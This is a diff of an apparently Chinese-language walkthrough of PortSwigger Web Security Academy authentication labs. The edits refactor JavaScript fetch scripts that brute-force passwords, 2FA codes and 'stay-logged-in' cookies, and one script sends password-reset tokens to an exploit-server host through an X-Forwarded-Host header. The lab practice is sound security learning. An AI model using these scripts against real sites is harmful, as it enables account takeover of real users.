@@ -233,7 +233,6 @@ function login(username, password) {
     },
     body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
     method: "POST",
-    mode: "cors",
     credentials: "include",
   });
 }
@@ -327,7 +326,6 @@ function login(username, password) {
     },
     body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
     method: "POST",
-    mode: "cors",
     credentials: "include",
   });
 }
@@ -400,18 +398,14 @@ async function main() {
 
 ```js
 function loginWiener() {
-  fetch(
-    "https://0a7a00c20376c23880502121006a0043.web-security-academy.net/login",
-    {
-      headers: {
-        "content-type": "application/x-www-form-urlencoded",
-      },
-      body: "username=wiener&password=peter",
-      method: "POST",
-      mode: "cors",
-      credentials: "include",
+  fetch(`${location.origin}/login`, {
+    headers: {
+      "content-type": "application/x-www-form-urlencoded",
     },
-  );
+    body: "username=wiener&password=peter",
+    method: "POST",
+    credentials: "include",
+  });
 }
 
 async function main() {
@@ -532,21 +526,17 @@ You have made too many incorrect login attempts. Please try again in 1 minute(s)
 題目說 multiple credentials per request，所幸死馬當活馬醫，直接把所有 passwords 塞進去一個 HTTP Request
 
 ```js
-fetch(
-  "https://0a20008604f3a7bf80c0ada400a50066.web-security-academy.net/login",
-  {
-    headers: {
-      "content-type": "application/json",
-    },
-    body: JSON.stringify({
-      username: "carlos",
-      password: passwords,
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/login`, {
+  headers: {
+    "content-type": "application/json",
   },
-);
+  body: JSON.stringify({
+    username: "carlos",
+    password: passwords,
+  }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 結果就神奇的通關了，是說真的會有後端這樣設計登入流程嗎...
@@ -560,7 +550,7 @@ fetch(
 
 先用 `carlos:montoya` 登入
 
-之後直接進入 https://0a9000cc0485827580ab9e100042008e.web-security-academy.net/my-account?id=carlos 就成功 Bypass
+之後直接進入 `/my-account?id=carlos` 就成功 Bypass
 
 ## Lab: 2FA broken logic
 
@@ -579,18 +569,14 @@ const codes = Array(10000)
   .map((zero, idx) => String(idx).padStart(4, "0"));
 
 function login(code) {
-  return fetch(
-    "https://0ada00380311b61280cc0822004d00f6.web-security-academy.net/login2",
-    {
-      headers: {
-        "content-type": "application/x-www-form-urlencoded",
-      },
-      body: `mfa-code=${code}`,
-      method: "POST",
-      mode: "cors",
-      credentials: "include",
+  return fetch(`${location.origin}/login2`, {
+    headers: {
+      "content-type": "application/x-www-form-urlencoded",
     },
-  );
+    body: `mfa-code=${code}`,
+    method: "POST",
+    credentials: "include",
+  });
 }
 
 async function main() {
@@ -623,7 +609,6 @@ function login(csrf) {
     },
     body: `csrf=${csrf}&username=carlos&password=montoya`,
     method: "POST",
-    mode: "cors",
     credentials: "include",
   });
 }
@@ -634,7 +619,6 @@ function login2(code, csrf) {
     },
     body: `mfa-code=${code}&csrf=${csrf}`,
     method: "POST",
-    mode: "cors",
     credentials: "include",
   });
 }
@@ -849,9 +833,7 @@ console.log(hashedPasswords);
 ```js
 function myAccount(pass) {
   document.cookie = `stay-logged-in=${btoa(`carlos:${pass}`)}`;
-  return fetch(
-    `https://0ae9005104abe88e801e3f6300f50090.web-security-academy.net/my-account?id=carlos`,
-  );
+  return fetch(`${location.origin}/my-account?id=carlos`);
 }
 
 async function main() {
@@ -935,20 +917,16 @@ carlos:onceuponatime
 這題我怎覺得是 Expert 等級，主要是我沒想到要用 `X-Forwarded-Host`
 
 ```js
-fetch(
-  "https://0a65009404c6b12682350b1f008900d0.web-security-academy.net/forgot-password",
-  {
-    headers: {
-      "content-type": "application/x-www-form-urlencoded",
-      "X-Forwarded-Host":
-        "exploit-0ae9008f0486b173822c0a6d014a008f.exploit-server.net",
-    },
-    body: "username=carlos",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/forgot-password`, {
+  headers: {
+    "content-type": "application/x-www-form-urlencoded",
+    "X-Forwarded-Host":
+      "exploit-0ae9008f0486b173822c0a6d014a008f.exploit-server.net",
   },
-);
+  body: "username=carlos",
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 之後看 log
@@ -974,18 +952,14 @@ fetch(
 
 ```js
 function changePassword(currentPassword) {
-  return fetch(
-    "https://0ad400fa03d6c6df81df8e7700b500ac.web-security-academy.net/my-account/change-password",
-    {
-      headers: {
-        "content-type": "application/x-www-form-urlencoded",
-      },
-      body: `username=carlos&current-password=${currentPassword}&new-password-1=123&new-password-2=456`,
-      method: "POST",
-      mode: "cors",
-      credentials: "include",
+  return fetch(`${location.origin}/my-account/change-password`, {
+    headers: {
+      "content-type": "application/x-www-form-urlencoded",
     },
-  );
+    body: `username=carlos&current-password=${currentPassword}&new-password-1=123&new-password-2=456`,
+    method: "POST",
+    credentials: "include",
+  });
 }
 
 async function main() {
